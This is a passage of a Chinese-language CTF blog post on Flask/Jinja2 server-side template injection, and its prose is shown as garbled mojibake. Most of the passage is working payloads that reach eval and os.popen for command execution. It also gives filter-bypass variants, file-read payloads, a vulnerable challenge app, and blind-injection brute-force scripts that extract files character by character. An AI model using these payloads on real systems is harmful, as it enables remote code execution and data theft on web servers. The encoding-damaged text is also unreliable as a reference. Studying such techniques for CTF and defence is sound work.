<p>ä¹‹åæ…¢æ…¢å»å¯»æ‰¾å³å¯ï¼Œè¯¥æ–‡ç« ä¸­æœ‰ï¼Œåœ¨catch_warnningsæ¨¡å—ä¸‹å«æœ‰builtinsï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªå»æ‰¾evalï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;)    &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>è¡¥å……æ€è·¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="string">&quot;catch_warnings&quot;</span>].__init__.__globals__.__builtins__[<span class="string">&quot;eval&quot;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)  &#125;&#125;</span><br></pre></td></tr></table></figure>







<h2 id="1-3æ€»ç»“åšé¢˜çš„æ€è·¯ï¼š"><a href="#1-3æ€»ç»“åšé¢˜çš„æ€è·¯ï¼š" class="headerlink" title="1.3æ€»ç»“åšé¢˜çš„æ€è·¯ï¼š"></a>1.3æ€»ç»“åšé¢˜çš„æ€è·¯ï¼š</h2><p>æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬è¦ä¹ˆå»æ‰¾builtinså‡½æ•°ä¸‹çš„evalï¼Œè¦ä¹ˆå»æ‰¾osã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D; %EF%B9%9B%EF%B9%9Bself.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read()%EF%B9%9C%EF%B9%9C</span><br></pre></td></tr></table></figure>



<h1 id="2-è°ˆè°ˆè¿‡æ»¤"><a href="#2-è°ˆè°ˆè¿‡æ»¤" class="headerlink" title="2.è°ˆè°ˆè¿‡æ»¤"></a>2.è°ˆè°ˆè¿‡æ»¤</h1><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¼šé‡è§å„ç§å„æ ·çš„è¿‡æ»¤ï¼Œæ¯”å¦‚æˆ‘ä»¬é‡è§å¯¹configçš„è¿‡æ»¤ï¼Œä»¥åŠosè¿‡æ»¤å•Šç­‰ç­‰</p>
<h2 id="2-1-è¿‡æ»¤äº†osï¼Œsystemç­‰çš„æƒ…å†µ"><a href="#2-1-è¿‡æ»¤äº†osï¼Œsystemç­‰çš„æƒ…å†µ" class="headerlink" title="2.1 è¿‡æ»¤äº†osï¼Œsystemç­‰çš„æƒ…å†µ"></a>2.1 è¿‡æ»¤äº†osï¼Œsystemç­‰çš„æƒ…å†µ</h2><p>åœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ä¹Ÿä¸éœ€æ…Œï¼Œå¦‚æœåªæ˜¯å¯¹ä¸­æ‹¬å·ä¸­å¯èƒ½ç”¨åˆ°çš„å†…å®¹è¿›è¡Œè¿‡æ»¤çš„è¯ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡æ‹¼æ¥ç»•è¿‡ï¼š</p>
<p>æ¯”å¦‚æˆ‘ä»¬ä¹‹å‰çš„payloadä¿®æ”¹æˆï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-è¿‡æ»¤äº†ä¸­æ‹¬å·"><a href="#2-2-è¿‡æ»¤äº†ä¸­æ‹¬å·" class="headerlink" title="2.2 è¿‡æ»¤äº†ä¸­æ‹¬å·"></a>2.2 è¿‡æ»¤äº†ä¸­æ‹¬å·</h2><p>è¿™æ ·çš„è¯,å¯ä»¥ç”¨getitemæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç­‰ä»·äºä¸€ä¸ªè¿­ä»£å™¨çš„é€‰æ‹©ï¼Œå¼€å‘è€…çš„åŸæ„æ˜¯è®©äººä»¬å¯ä»¥ç”¨è¿™ä¸ªè¿­ä»£å¯¹è±¡,è¿™ç¯‡æ–‡ç« è®²çš„ä¸é”™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775</span><br></pre></td></tr></table></figure>

<p>Pythonçš„é­”æ³•æ–¹æ³•<code>__getitem__</code> å¯ä»¥è®©å¯¹è±¡å®ç°è¿­ä»£åŠŸèƒ½ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨<code>for...in...</code> æ¥è¿­ä»£è¯¥å¯¹è±¡äº†ï¼ŒåŒæ—¶ä¹Ÿå…è®¸æˆ‘ä»¬åˆ©ç”¨gettiemæ¥ç›´æ¥é€‰æ‹©å†…å®¹,æ‰€ä»¥æˆ‘ä»¬ä¹‹å‰çš„payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config.__init__.__globals__.__getitem__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir()&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨requestèµ·æ­¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; request.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">192</span>).__init__.__globals__.__builtins__.__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-3-è¿‡æ»¤äº†-å·"><a href="#2-3-è¿‡æ»¤äº†-å·" class="headerlink" title="2.3 è¿‡æ»¤äº†.å·"></a>2.3 è¿‡æ»¤äº†.å·</h2><p>è¿™ä¸ªå¯ä»¥ä½¿ç”¨attræ¥è¿›è¡Œç»•è¿‡äº†ï¼Œç›´æ¥ç»™å‡ºç»•è¿‡æ–¹æ³•ï¼š</p>
<p>æ‰€ä»¥ä¹‹å‰çš„payloadè¿›è¡Œå¯¹æ¯”ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__ = []|attr(__class__)</span><br><span class="line">&#123;&#123;[]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()  &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">190</span>]  &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">192</span>]|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(__getitem__)(<span class="string">&#x27;eval&#x27;</span>)  &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨æˆ‘ä»ä¸Šå¾€ä¸‹ç»§ç»­å–å€¼çš„æ—¶å€™ï¼Œæ€ä¹ˆéƒ½æ²¡æ³•ç»§ç»­å‘ä¸‹å–å€¼äº†ã€‚ä½†æ˜¯çœ‹è§å¯ä»¥è½¬æ¢æ€è·¯</p>
<h2 id="2-5åˆ©ç”¨request"><a href="#2-5åˆ©ç”¨request" class="headerlink" title="2.5åˆ©ç”¨request"></a>2.5åˆ©ç”¨request</h2><p>â€‹    å› ä¸ºflaskæ­¤æ—¶èƒ½å…è®¸ç”¨æˆ·è‡ªå®šä¹‰è¾“å‡ºï¼Œåæœ‰å…«ä¹æ˜¯æœ‰requestçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å»åˆ©ç”¨è¿™ä¸ªä¹Ÿä¸æ˜¯ç›¸å½“ä¸é”™çš„</p>
<p>è¿™é‡Œç¿»é˜…åˆ°äº†ä¸€ä¸ªè€å¤–æ€è·¯ï¼Œä½†æ˜¯ä»–æ²¡ç»™å…¨ã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;)      &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨requestçš„æ€è·¯å»é‡æ–°æŠŠpayloadæ‹¼å‡ºæ¥</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()</span><br></pre></td></tr></table></figure>



<h2 id="2-4å°†ä¸­æ‹¬å·å’Œ-å·éƒ½è¿‡æ»¤æƒ…å†µä¸‹"><a href="#2-4å°†ä¸­æ‹¬å·å’Œ-å·éƒ½è¿‡æ»¤æƒ…å†µä¸‹" class="headerlink" title="2.4å°†ä¸­æ‹¬å·å’Œ.å·éƒ½è¿‡æ»¤æƒ…å†µä¸‹"></a>2.4å°†ä¸­æ‹¬å·å’Œ.å·éƒ½è¿‡æ»¤æƒ…å†µä¸‹</h2><p>å½“ç„¶ä¸Šé¢çš„éš¾åº¦éƒ½æ˜¯ç›¸å½“ç®€å•çš„é¢˜ç›®æ‰ä¼šé‡è§äº†ï¼Œåœ¨å½“å‰ç¯å¢ƒä¸‹ï¼Œå¾€å¾€ä¼šè¿‡æ»¤çš„ç›¸å½“ä¸¥æ ¼ï¼Œæˆ‘ä»¬åº”è¯¥ä»flaskæœ¬èº«å‡ºç°çš„ç±»å¼€å§‹æ‰¾ï¼Œæ¯”å¦‚é¢˜ç›®å¯èƒ½éªŒè¯çš„æ—¶å€™ï¼Œä»…ä»…éªŒè¯æˆ‘ä»¬è¾“å…¥çš„idã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ­¤ï¼Œè®©flaskè¯»å–headerä¸­çš„å†…å®¹ï¼Œè¿™æ ·å°±å¯ä»¥æ‰“ç ´é™åˆ¶</p>
<p>æˆ‘ä»¬å¯ä»¥å…ˆå†™ä¸€ä¸ªè„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;</span>) &#125;&#125;       </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹‹åä¸ºäº†ç»•è¿‡æ‹¬å·çš„é™åˆ¶ï¼Œé‡‡ç”¨è¿™ç§æ–¹æ³•ï¼š</p>
<p>è¿™é‡Œç»™å‡ºä¸€ä¸ªpayloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> c|attr(request.headers.x4)==request.headers.x5 %&#125;</span><br><span class="line">    &#123;%<span class="keyword">for</span> d <span class="keyword">in</span> ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125;</span><br><span class="line">        &#123;%<span class="keyword">if</span> d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif%&#125;</span><br><span class="line">&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">x13: </span><br><span class="line">x9: <span class="built_in">eval</span></span><br><span class="line">x8: __builtins__</span><br><span class="line">x7: __globals__</span><br><span class="line">x6: __init__</span><br><span class="line">x5: catch_warnings</span><br><span class="line">x4: __name__</span><br><span class="line">x3: __subclasses__</span><br><span class="line">x2: __base__</span><br><span class="line">x1: __class__</span><br></pre></td></tr></table></figure>

<h2 id="2-6-è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·çš„æƒ…å†µ"><a href="#2-6-è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·çš„æƒ…å†µ" class="headerlink" title="2.6 è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·çš„æƒ…å†µ"></a>2.6 è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·çš„æƒ…å†µ</h2><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±åªèƒ½å»å°è¯•æŸ¥æ‰¾å„ç±»çš„openå‡½æ•°äº†ï¼Œæ²¡æœ‰åŠæ³•æ‰§è¡Œå‘½ä»¤äº†ï¼Œäºæ˜¯æŸ¥æ‰¾åˆ°ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()</span><br></pre></td></tr></table></figure>

<p>ä¹‹åä¸ºäº†ç»•è¿‡å¼•å·çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å°è¯•ä½¿ç”¨request.args.x1çš„æ–¹å¼è¿›è¡Œç»•è¿‡</p>
<p>æ‹¼å‡‘å¾—ï¼š</p>
<h2 id="2-7-è¯»å–æ–‡ä»¶"><a href="#2-7-è¯»å–æ–‡ä»¶" class="headerlink" title="2.7 è¯»å–æ–‡ä»¶"></a>2.7 è¯»å–æ–‡ä»¶</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1=flag</span><br></pre></td></tr></table></figure>

<p>è€Œå®é™…ä¸Šï¼Œæˆ‘å‘ç°ä¸­æ‹¬å·ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œæ›¿ä»£çš„</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[request.args.x1](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;)    &#125;&#125;&amp;x1=eval</span><br></pre></td></tr></table></figure>

<p>æ‹¼å‡‘å¾—å‡ºï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[request.args.x1].popen(request.args.x2).read() &#125;&#125;&amp;x1=os&amp;x2=dir</span><br></pre></td></tr></table></figure>



<h2 id="2-8è¿‡æ»¤äº†evalï¼Œpopenï¼Œä¸¤ä¸ªå·¦èŠ±æ‹¬å·"><a href="#2-8è¿‡æ»¤äº†evalï¼Œpopenï¼Œä¸¤ä¸ªå·¦èŠ±æ‹¬å·" class="headerlink" title="2.8è¿‡æ»¤äº†evalï¼Œpopenï¼Œä¸¤ä¸ªå·¦èŠ±æ‹¬å·"></a>2.8è¿‡æ»¤äº†evalï¼Œpopenï¼Œä¸¤ä¸ªå·¦èŠ±æ‹¬å·</h2><p>è¿™é‡Œè®°å½•ä¸€ä¸‹è‡ªå·±å­¦ä¹ åˆ°çš„ä¸€é“é¢˜ç›®ï¼š</p>
<h3 id="ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›ï¼š"><a href="#ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›ï¼š" class="headerlink" title="ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›ï¼š"></a>ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›ï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span>__</span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span>():</span></span><br><span class="line">    <span class="built_in">help</span> = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    <span class="comment">#No way to get flag!</span></span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /flag&#x27;</span>)</span><br><span class="line">    url = name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    r = request.path</span><br><span class="line">    r = request.data.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">        t = Template(<span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line">    t = Template(r + <span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜æ¯”è¾ƒæ–°æœ‰æ„æ€çš„ç‚¹åœ¨ä¸¤ä¸ªåœ°æ–¹ï¼š</p>
<p>è¿‡æ»¤äº†è¿™ä¸ªåœ°æ–¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†{ {} },è¿™æ ·å­çš„æƒ…å†µä»¥å‰è‡ªå·±æ²¡æœ‰é‡è¿‡ï¼Œåæ¥çŸ¥é“å¯ä»¥è¿›è¡Œç›²æ³¨ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶çš„payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œåˆ™ä¼šè¾“å‡º<del>p0</del>ï¼Œå¦åˆ™å°±ä¸ä¼šè¾“å‡ºã€‚ç¬¬äºŒç‚¹ï¼Œæˆ‘ä»¬è¯¥è¯»å–ä»€ä¹ˆæ–‡ä»¶å‘¢ï¼Ÿ</p>
<p>è¿™é‡Œè¿ç”¨äº†os.system(â€œrm -f /flagâ€)</p>
<p>é»˜è®¤çš„è¿›ç¨‹åˆ é™¤åä¼šå­˜æ”¾åœ¨æš‚æ—¶æ–‡ä»¶ä¸­ï¼Œè¿›ç¨‹ä¸ºï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/proc/self/fd/3</span><br></pre></td></tr></table></figure>

<p>æ•…ç¼–å†™è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.post(url, data=payload,headers=headers).text</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;~p0~&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sa=string.printable</span><br><span class="line"><span class="comment">#print(s)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> sa:</span><br><span class="line">        payload=<span class="string">&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">            i + <span class="number">1</span>) + <span class="string">&#x27;] == &quot;&#x27;</span> + c + <span class="string">&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(password)</span><br></pre></td></tr></table></figure>

<p>è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8080&quot;</span></span><br><span class="line"><span class="built_in">list</span> = string.ascii_letters + string.digits+ <span class="string">&quot;-/_&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">999</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+j+<span class="string">&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data =&#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        res = requests.get(url,params=data).text</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;~p0~&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">            flag+=j</span><br><span class="line">            print(<span class="string">&quot;flag:&quot;</span> + flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸€ä¸ªï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()|attr(request.values.x4)(<span class="number">233</span>)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4)(request.values.x7)|attr(request.values.x4)(request.values.x8)(request.values.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=<span class="built_in">eval</span>&amp;x9=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat flag.txt&quot;</span>).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="2-8è¿‡æ»¤äº†ç©ºæ ¼ï¼Œrequests"><a href="#2-8è¿‡æ»¤äº†ç©ºæ ¼ï¼Œrequests" class="headerlink" title="2.8è¿‡æ»¤äº†ç©ºæ ¼ï¼Œrequests"></a>2.8è¿‡æ»¤äº†ç©ºæ ¼ï¼Œrequests</h2><p>payloadåŸºæœ¬æ²¡æœ‰å˜åŠ¨ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹è¿˜è¢«æ¶å¿ƒäº†ä¸€ä¸‹requestï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥è¿™æ ·ç”¨ï¼š</p>
<p>åŸæœ¬æ­£å¸¸çš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1&#x3D;flag</span><br></pre></td></tr></table></figure>

<p>æ”¹é€ åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;cat\x20&#x2F;flag&quot;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-9åˆ©ç”¨-ç›´æ¥è¯»å–æ–‡ä»¶"><a href="#2-9åˆ©ç”¨-ç›´æ¥è¯»å–æ–‡ä»¶" class="headerlink" title="2.9åˆ©ç”¨{   %ç›´æ¥è¯»å–æ–‡ä»¶"></a>2.9åˆ©ç”¨{   %ç›´æ¥è¯»å–æ–‡ä»¶</h2><p>ä»¥å‰ä¸€ç›´ä»¥ä¸º æ˜¯ä¸èƒ½ç›´æ¥è¯»å–æ–‡ä»¶çš„ï¼Œåé¢æ‰å‘ç°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(config)%&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¯ä»¥æ­£å¸¸çš„è¾“å‡ºè¯­å¥</p>
<p>å°†ä¸‹é¢è¿™äº›ï¼š</p>
